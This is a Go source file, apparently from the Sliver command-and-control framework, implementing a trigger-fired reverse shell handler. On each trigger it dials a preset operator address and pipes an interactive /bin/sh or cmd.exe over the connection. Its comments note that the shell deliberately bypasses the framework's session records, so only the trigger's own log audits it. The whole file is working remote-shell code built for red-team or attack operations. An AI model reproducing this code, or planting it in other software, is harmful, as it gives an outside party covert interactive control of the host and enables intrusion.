package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2026  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"crypto/tls"
	"errors"
	"fmt"
	"net"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/0x90pkt/trigger/pkg/intents"

	"github.com/bishopfox/sliver/server/log"
)

var reverseShellLog = log.NamedLogger("c2", "trigger-reverse-shell")

// dialerFunc / spawnerFunc are the indirections tests use to simulate
// dial + exec without opening sockets or spawning real shells. They
// live on the handler struct (not as package-level vars) so concurrent
// fire goroutines from independent handler instances can't race on
// shared globals during test teardown.
type dialerFunc func(network, addr string, timeout time.Duration, useTLS bool, tlsCfg *tls.Config) (net.Conn, error)
type spawnerFunc func(ctx context.Context, name string, args ...string) *exec.Cmd

func defaultDialer() dialerFunc {
	return func(network, addr string, timeout time.Duration, useTLS bool, tlsCfg *tls.Config) (net.Conn, error) {
		if useTLS {
			d := &net.Dialer{Timeout: timeout}
			return tls.DialWithDialer(d, network, addr, tlsCfg)
		}
		return net.DialTimeout(network, addr, timeout)
	}
}

func defaultSpawner() spawnerFunc {
	return func(ctx context.Context, name string, args ...string) *exec.Cmd {
		return exec.CommandContext(ctx, name, args...)
	}
}

// ReverseShellConfig is the construction-time config for a
// ReverseShell handler.
//
// Operational notes:
//
//   - OperatorAddr is locked at construction. There is no runtime
//     templating — a crafted client_id cannot redirect the shell to
//     an attacker-controlled endpoint.
//
//   - This handler does NOT create or touch a Sliver Session record.
//     core.Sessions, core.Beacons, and db.Session() are deliberately
//     untouched. The shell is a side channel from the Sliver SERVER
//     host to a pre-bound operator endpoint, audited only by the
//     trigger's own audit log.
//
//   - The interactive shell runs in a detached goroutine. The handler
//     itself returns nil immediately after fork so the listener
//     worker is freed. Listener-level rate limiting is the only
//     defense against shell-spam; configure --per-client-requests-per-minute
//     accordingly when binding this handler.
//
//   - No pty allocation in this MVP. The remote operator can use
//     `socat`/`script`/`stty` on their side, or run inside `tmux`,
//     for a usable interactive experience. A pty-upgrade path is
//     a future enhancement.
type ReverseShellConfig struct {
	// OperatorAddr is the host:port the server dials out to on fire.
	OperatorAddr string
	// ShellPath is the absolute path of the shell binary. Empty =>
	// platform default: /bin/sh on Linux/Darwin, cmd.exe on Windows.
	ShellPath string
	// ShellArgs is the verbatim argv passed to the shell. Empty =>
	// platform default: ["-i"] on Linux/Darwin.
	ShellArgs []string
	// DialTimeout bounds the connect attempt. Default 5s.
	DialTimeout time.Duration
	// MaxSessionDuration bounds total shell lifetime (defense against
	// stuck sessions wedging server resources). Default 30 minutes.
	MaxSessionDuration time.Duration
	// UseTLS wraps the operator-channel in TLS. Recommended.
	UseTLS bool
	// TLSConfig overrides the default TLS config (ServerName, RootCAs,
	// etc.). Ignored if UseTLS=false.
	TLSConfig *tls.Config
}

// defaultMaxConcurrentSessions caps how many reverse shells a single
// handler instance will run simultaneously. Prevents resource
// exhaustion if an adversary replays triggers faster than sessions
// terminate.
const defaultMaxConcurrentSessions = 10

// ReverseShell is an intents.Handler that, on fire, dials a pre-bound
// operator endpoint and plumbs an interactive shell over the
// connection. Fire-and-forget: handler returns nil as soon as the
// shell goroutine is launched.
type ReverseShell struct {
	intent  string
	cfg     ReverseShellConfig
	shell   string
	args    []string
	timeout time.Duration
	maxLife time.Duration

	dialer  dialerFunc
	spawner spawnerFunc

	// sem limits concurrent fire goroutines. A buffered channel acts
	// as a lightweight counting semaphore.
	sem chan struct{}

	// fireDone is non-nil only in tests; closed when the detached
	// fire goroutine returns. Lets tests synchronize on completion
	// instead of sleeping.
	fireDone chan struct{}
}

// NewReverseShell constructs a ReverseShell handler. Validates the
// operator endpoint and shell path at construction so bad bindings
// fail fast.
func NewReverseShell(intent string, cfg ReverseShellConfig) (*ReverseShell, error) {
	if strings.TrimSpace(intent) == "" {
		return nil, errors.New("reverse-shell: task name must be set")
	}
	if strings.TrimSpace(cfg.OperatorAddr) == "" {
		return nil, errors.New("reverse-shell: OperatorAddr must be set (host:port)")
	}
	host, port, err := net.SplitHostPort(cfg.OperatorAddr)
	if err != nil {
		return nil, fmt.Errorf("reverse-shell: invalid OperatorAddr %q: %w", cfg.OperatorAddr, err)
	}
	if host == "" || port == "" {
		return nil, fmt.Errorf("reverse-shell: OperatorAddr %q missing host or port", cfg.OperatorAddr)
	}

	shell := cfg.ShellPath
	if shell == "" {
		shell = defaultShellPath()
	}
	if !filepath.IsAbs(shell) {
		return nil, fmt.Errorf("reverse-shell: ShellPath %q must be absolute", shell)
	}
	args := cfg.ShellArgs
	if len(args) == 0 {
		args = defaultShellArgs()
	}

	timeout := cfg.DialTimeout
	if timeout <= 0 {
		timeout = 5 * time.Second
	}
	maxLife := cfg.MaxSessionDuration
	if maxLife <= 0 {
		maxLife = 30 * time.Minute
	}

	return &ReverseShell{
		intent:  intent,
		cfg:     cfg,
		shell:   shell,
		args:    args,
		timeout: timeout,
		maxLife: maxLife,
		dialer:  defaultDialer(),
		spawner: defaultSpawner(),
		sem:     make(chan struct{}, defaultMaxConcurrentSessions),
	}, nil
}

// Name implements intents.Handler.
func (h *ReverseShell) Name() string { return h.intent }

// Execute implements intents.Handler. Fires the reverse shell in a
// detached goroutine and returns nil. Errors (dial failure, exec
// failure) are logged but do NOT propagate back to the listener —
// the listener already accepted the trigger by the time we get here,
// and the operator's feedback is the connect-back, not a return
// value.
//
// The detached goroutine is bounded by MaxSessionDuration via context
// so a stuck shell can't leak forever.
func (h *ReverseShell) Execute(_ context.Context, evt intents.Event) error {
	select {
	case h.sem <- struct{}{}:
		// Slot acquired; fire in background.
		go h.fire(evt)
	default:
		reverseShellLog.Warnf("reverse-shell: max concurrent sessions (%d) reached, dropping trigger from %s",
			cap(h.sem), evt.ClientID)
	}
	return nil
}

func (h *ReverseShell) fire(evt intents.Event) {
	defer func() {
		<-h.sem // release semaphore slot
		if h.fireDone != nil {
			close(h.fireDone)
		}
	}()

	reverseShellLog.Infof("reverse-shell fired: intent=%s operator=%s shell=%s triggered_by=%s source_ip=%s nonce=%s",
		h.intent, h.cfg.OperatorAddr, h.shell, evt.ClientID, evt.SourceIP, evt.Nonce)

	conn, err := h.dialer("tcp", h.cfg.OperatorAddr, h.timeout, h.cfg.UseTLS, h.cfg.TLSConfig)
	if err != nil {
		reverseShellLog.Errorf("reverse-shell dial failed: intent=%s operator=%s err=%v",
			h.intent, h.cfg.OperatorAddr, err)
		return
	}
	defer conn.Close()

	ctx, cancel := context.WithTimeout(context.Background(), h.maxLife)
	defer cancel()

	cmd := h.spawner(ctx, h.shell, h.args...)
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	runErr := cmd.Run()
	reverseShellLog.Infof("reverse-shell session ended: intent=%s operator=%s err=%v",
		h.intent, h.cfg.OperatorAddr, runErr)
}

// defaultShellPath returns the conventional interactive shell for the
// current GOOS.
func defaultShellPath() string {
	switch runtime.GOOS {
	case "windows":
		return `C:\Windows\System32\cmd.exe`
	default:
		return "/bin/sh"
	}
}

// defaultShellArgs returns the conventional argv for an interactive
// shell on the current GOOS.
func defaultShellArgs() []string {
	switch runtime.GOOS {
	case "windows":
		return nil
	default:
		return []string{"-i"}
	}
}
